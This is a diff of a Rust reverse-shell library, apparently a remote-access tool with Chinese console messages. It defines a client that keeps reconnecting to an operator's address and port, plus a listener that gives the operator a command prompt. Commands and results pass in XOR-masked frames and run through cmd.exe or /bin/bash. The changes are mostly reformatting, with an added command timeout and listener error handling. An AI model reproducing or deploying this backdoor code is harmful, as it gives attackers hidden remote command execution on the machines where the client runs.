@@ -3,28 +3,32 @@ use std::io::{Read, Write, Error, ErrorKind};
 use std::str::FromStr;
 use std::process::Command;
 use serde::{Serialize, Deserialize};
+use std::time::Duration;
+use std::sync::mpsc::{RecvTimeoutError, channel};
 
 
 pub struct CShell(String, u16);
+
 pub struct RShell(TcpListener);
+
 pub struct CRemote(TcpStream, bool);
+
 pub struct SRemote(TcpStream, bool);
 
 
 #[derive(Serialize, Deserialize, Debug)]
 pub struct RCommand(usize, u8);
 
-pub trait CommandReader{
-    fn read_command(&mut self)->  Option<String>;
+pub trait CommandReader {
+    fn read_command(&mut self) -> Option<String>;
 }
 
-pub trait CommandWrite{
+pub trait CommandWrite {
     fn write_command(&mut self, command: String) -> Option<String>;
 }
 
-impl RCommand{
-
-    pub fn pack(data: &Vec<u8>)->Vec<u8>{
+impl RCommand {
+    pub fn pack(data: &Vec<u8>) -> Vec<u8> {
         let seq = max(data);
         let mut ret = RCommand(data.len(), max(data)).serialize();
 
@@ -36,12 +40,12 @@ impl RCommand{
         ret
     }
 
-    pub fn size()->usize{
+    pub fn size() -> usize {
         std::mem::size_of::<RCommand>()
     }
 
     pub fn serialize(&self) -> Vec<u8> {
-       bincode::serialize(self).expect("无法序列化")
+        bincode::serialize(self).expect("无法序列化")
     }
 
     pub fn deserialize(bytes: &Vec<u8>) -> RCommand {
@@ -50,26 +54,26 @@ impl RCommand{
 }
 
 
-impl CRemote{
-    pub fn is_live(&self)->bool{
+impl CRemote {
+    pub fn is_live(&self) -> bool {
         self.1
     }
 
-    pub fn write_result(&mut self, res: Vec<u8>){
+    pub fn write_result(&mut self, res: Vec<u8>) {
         if let Err(_e) = self.0.write(RCommand::pack(&res).as_slice()) {
-           self.1 = false;
+            self.1 = false;
         }
     }
 
     #[allow(unused_must_use)]
-    pub fn exit(&mut self){
+    pub fn exit(&mut self) {
         self.0.shutdown(Shutdown::Both);
         self.1 = false;
     }
 }
 
-impl SRemote{
-    pub fn is_live(&self)->bool{
+impl SRemote {
+    pub fn is_live(&self) -> bool {
         self.1
     }
 }
@@ -79,7 +83,7 @@ impl Iterator for CShell {
 
     fn next(&mut self) -> Option<Self::Item> {
         loop {
-            if let Ok(connect) = TcpStream::connect(SocketAddr::from_str(format!("{}:{}", self.0, self.1).as_str()).unwrap()){
+            if let Ok(connect) = TcpStream::connect(SocketAddr::from_str(format!("{}:{}", self.0, self.1).as_str()).unwrap()) {
                 connect.set_nodelay(true).unwrap();
                 return Option::from(CRemote(connect, true));
             }
@@ -87,16 +91,16 @@ impl Iterator for CShell {
     }
 }
 
-impl Iterator for RShell{
+impl Iterator for RShell {
     type Item = SRemote;
 
     fn next(&mut self) -> Option<Self::Item> {
-        println!("等待连接....");
+        println!("等待连接({})", self.0.local_addr().unwrap());
         for r in self.0.incoming() {
-            if let Ok(connect) = r{
+            if let Ok(connect) = r {
                 connect.set_nodelay(true).unwrap();
                 println!("已建立连接 {}", connect.peer_addr().unwrap());
-                return Some(SRemote(connect, true))
+                return Some(SRemote(connect, true));
             }
         }
         None
@@ -104,7 +108,7 @@ impl Iterator for RShell{
 }
 
 
-impl CommandReader for CRemote{
+impl CommandReader for CRemote {
     fn read_command(&mut self) -> Option<String> {
         loop {
             return match read_all(&mut self.0) {
@@ -115,28 +119,23 @@ impl CommandReader for CRemote{
                     self.1 = false;
                     None
                 }
-            }
+            };
         }
     }
 }
 
-impl CommandReader for SRemote{
+impl CommandReader for SRemote {
     fn read_command(&mut self) -> Option<String> {
         let addr = self.0.peer_addr().unwrap();
         while self.is_live() {
             print!("{}:{} $_> ", addr.ip(), addr.port());
             std::io::stdout().flush().unwrap();
             let mut command = String::new();
-            match std::io::stdin().read_line(&mut command) {
-                Ok(n) if n == 0 => {continue},
-                Ok(_n) => {
-                    let cmd = format_command(command.as_str());
-                    if cmd.len() == 0 {
-                        continue
-                    }
-                    return Some(String::from(cmd))
+            if let Ok(_) = std::io::stdin().read_line(&mut command) {
+                let command = format_command(&command);
+                if !command.is_empty() {
+                    return Some(command)
                 }
-                Err(_) => {}
             }
         }
         None
@@ -144,7 +143,7 @@ impl CommandReader for SRemote{
 }
 
 
-impl CommandWrite for SRemote{
+impl CommandWrite for SRemote {
     fn write_command(&mut self, command: String) -> Option<String> {
         match self.0.write(RCommand::pack(&Vec::from(command)).as_slice()) {
             Ok(_n) => {
@@ -156,7 +155,7 @@ impl CommandWrite for SRemote{
                         self.1 = false;
                         None
                     }
-                }
+                };
             }
             Err(_) => {
                 self.1 = false;
@@ -167,17 +166,17 @@ impl CommandWrite for SRemote{
 }
 
 
-pub fn format_command(command: &str)->String{
+pub fn format_command(command: &str) -> String {
     let command = command.trim_start().trim_end().replace("\n", "");
     let mut buffer = String::new();
     let mut c = 0;
-    for chr in command.chars(){
+    for chr in command.chars() {
         if chr == ' ' {
             c += 1;
-            continue
+            continue;
         }
 
-        if c > 1 || c == 1{
+        if c > 1 || c == 1 {
             buffer.push(' ');
             c = 0;
         }
@@ -188,7 +187,7 @@ pub fn format_command(command: &str)->String{
 }
 
 
-fn read_all(reader: &mut dyn Read)->Result<Vec<u8>, std::io::Error>{
+fn read_all(reader: &mut dyn Read) -> Result<Vec<u8>, std::io::Error> {
     let mut bytes = 0;
     let mut size = 0;
     let mut is_rc = true;
@@ -199,7 +198,7 @@ fn read_all(reader: &mut dyn Read)->Result<Vec<u8>, std::io::Error>{
         match reader.read(&mut buffer[bytes..]) {
             Ok(n) if n == 0 => {
                 return Err(Error::new(ErrorKind::ConnectionReset, "连接被关闭"));
-            },
+            }
             Ok(n) => {
                 bytes += n;
                 if is_rc && bytes == RCommand::size() {
@@ -210,31 +209,31 @@ fn read_all(reader: &mut dyn Read)->Result<Vec<u8>, std::io::Error>{
                     is_rc = false;
                     buffer.clear();
                     buffer.resize(size, 0);
-                }else if !is_rc && bytes == size{
+                } else if !is_rc && bytes == size {
                     return Ok(xor(seq, &buffer));
                 }
             }
             Err(e) => {
                 println!("{:?}", e);
-                return Err(e)
+                return Err(e);
             }
         }
     }
 }
 
-pub fn max(data: &Vec<u8>)->u8{
-    let mut i:u8 = 255;
-    loop{
+pub fn max(data: &Vec<u8>) -> u8 {
+    let mut i: u8 = 255;
+    loop {
         if data.contains(&i) {
             return i;
-        }else{
+        } else {
             i -= 1;
         }
     }
 }
 
 
-pub fn xor(seq: u8, data:& Vec<u8>)->Vec<u8>{
+pub fn xor(seq: u8, data: &Vec<u8>) -> Vec<u8> {
     let mut tmp = Vec::new();
     for code in data.iter() {
         tmp.push(code ^ seq)
@@ -243,25 +242,50 @@ pub fn xor(seq: u8, data:& Vec<u8>)->Vec<u8>{
 }
 
 
-pub fn build_command()->Command{
+pub fn build_command() -> Command {
     if cfg!(windows) {
         let mut cmd = Command::new("cmd.exe");
         cmd.arg("/c");
         cmd
-    }else{
+    } else {
         let mut cmd = Command::new("/bin/bash");
         cmd.arg("-c");
         cmd
     }
 }
 
+#[allow(unused_must_use)]
+pub fn spawn<T, R>(execute: T, timeout: Duration) -> Result<R, RecvTimeoutError>
+    where
+        T: FnOnce() -> R,
+        T: Send + 'static,
+        R: Send + 'static {
+    let (sender, recv) = channel();
+    let child = std::thread::spawn(move || {
+        sender.send( execute());
+    });
 
-pub fn listen(addr: &str, port:u16) -> std::io::Result<RShell> {
-    TcpListener::bind(SocketAddr::from_str(format!("{}:{}", addr, port).as_str()).unwrap()).and_then(|tcp|{
-        return Ok(RShell(tcp))
-    })
+    match recv.recv_timeout(timeout) {
+        Ok(ret) => Ok(ret),
+        Err(e) => {
+            drop(child);
+            Err(e)
+        }
+    }
 }
 
-pub fn shell(addr: &str, port: u16) ->CShell{
+
+pub fn listen(addr: &str, port: u16) -> std::io::Result<RShell> {
+    match TcpListener::bind(SocketAddr::from_str(format!("{}:{}", addr, port).as_str()).unwrap()){
+        Ok(tcp) => Ok(RShell(tcp)),
+        Err(e) => {
+            println!("开启监听失败({}:{}): {}",  addr, port, e.to_string());
+            Err(e)
+        }
+    }
+}
+
+
+pub fn shell(addr: &str, port: u16) -> CShell {
     CShell(String::from(addr), port)
 }
